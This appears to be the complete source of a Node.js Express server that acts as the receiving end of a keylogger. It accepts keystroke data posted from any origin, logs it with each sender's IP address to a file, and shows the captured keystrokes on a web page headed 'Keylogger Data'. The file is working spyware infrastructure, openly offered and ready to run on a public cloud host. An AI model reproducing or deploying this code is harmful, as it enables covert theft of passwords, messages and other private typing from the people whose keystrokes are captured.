const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");
const os = require("os");
const cors = require("cors");

const app = express();
const port = 8080;

// Enable CORS for all origins and methods
app.use(cors({
    origin: "*", // Allow all origins
    methods: ["GET", "POST"], // Allow specific methods
    allowedHeaders: ["Content-Type"], // Allow specific headers
}));

// Middleware for parsing JSON
app.use(bodyParser.json({ extended: true }));

// Serve the page with a black background and green text
app.get("/", (req, res) => {
    try {
        const kl_file = fs.readFileSync("./keyboard_capture.txt", { encoding: 'utf8', flag: 'r' });
        res.send(`
            <html>
                <head>
                    <title>Keylogger Data</title>
                    <style>
                        body {
                            background-color: black;
                            color: green;
                            font-family: monospace;
                            padding: 20px;
                        }
                        h1 {
                            text-align: center;
                            text-decoration: underline;
                        }
                        pre {
                            white-space: pre-wrap;
                            word-wrap: break-word;
                        }
                    </style>
                </head>
                <body>
                    <h1>Keystrokes from: ${os.hostname()}</h1>
                    <pre>${kl_file.replace(/\n/g, "<br>")}</pre>
                </body>
            </html>
        `);
    } catch {
        res.send(`
            <html>
                <head>
                    <title>Keylogger Data</title>
                    <style>
                        body {
                            background-color: black;
                            color: green;
                            font-family: monospace;
                            padding: 20px;
                        }
                        h1 {
                            text-align: center;
                            text-decoration: underline;
                        }
                    </style>
                </head>
                <body>
                    <h1>Nothing logged yet.</h1>
                </body>
            </html>
        `);
    }
});

// Handle POST request to receive keystrokes
app.post("/", (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress; // Get client's IP
    console.log(`[Received from ${ip}]: ${req.body.keyboardData}`);

    // Append keystrokes to the log file
    fs.appendFileSync("keyboard_capture.txt", `\n[${ip}] ${req.body.keyboardData}`);
    res.send("Successfully logged the data");
});

// Make the server listen on all available IPs (important for AWS access)
app.listen(port, "0.0.0.0", () => {
    console.log(`Server is running on port ${port}`);
});